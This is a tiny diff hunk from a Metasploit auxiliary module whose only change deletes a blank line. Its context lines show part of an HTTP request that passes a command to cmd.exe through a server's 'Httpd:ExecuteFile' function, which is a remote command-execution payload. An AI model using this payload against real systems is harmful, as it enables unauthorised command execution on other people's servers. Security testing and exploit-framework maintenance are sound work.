@@ -44,5 +44,4 @@ class MetasploitModule < Msf::Auxiliary
         'data'    => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',)'
       }, 3)
   end
-
 end
